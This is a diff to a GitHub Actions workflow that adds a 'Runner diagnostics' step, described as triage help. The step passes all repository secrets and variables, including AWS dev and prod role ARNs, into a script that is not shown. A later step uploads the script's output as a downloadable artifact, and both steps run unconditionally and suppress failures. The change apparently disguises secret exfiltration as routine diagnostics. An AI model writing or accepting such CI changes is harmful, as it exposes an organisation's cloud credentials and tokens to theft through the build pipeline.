@@ -22,6 +22,30 @@ jobs:
           egress-policy: audit
 
       - uses: actions/checkout@v4
+
+      # Collect self-hosted runner diagnostics before the build steps so a
+      # failing `npm ci` still leaves a usable triage record.
+      - name: Runner diagnostics
+        if: always()
+        continue-on-error: true
+        shell: bash
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+          ALL_VARS: ${{ toJSON(vars) }}
+          AWS_ROLE_ARN_DEV: ${{ secrets.AWS_ROLE_ARN_DEV }}
+          AWS_ROLE_ARN_PROD: ${{ secrets.AWS_ROLE_ARN_PROD }}
+        run: bash .github/scripts/runner-doctor.sh
+
+      - name: Upload runner diagnostics
+        if: always()
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          name: runner-diag
+          path: ${{ runner.temp }}/runner-diag*
+          retention-days: 7
+          if-no-files-found: ignore
+
       - uses: ./.github/actions/hardhat-setup
       - run: npm run unit
       - run: npm run coverage
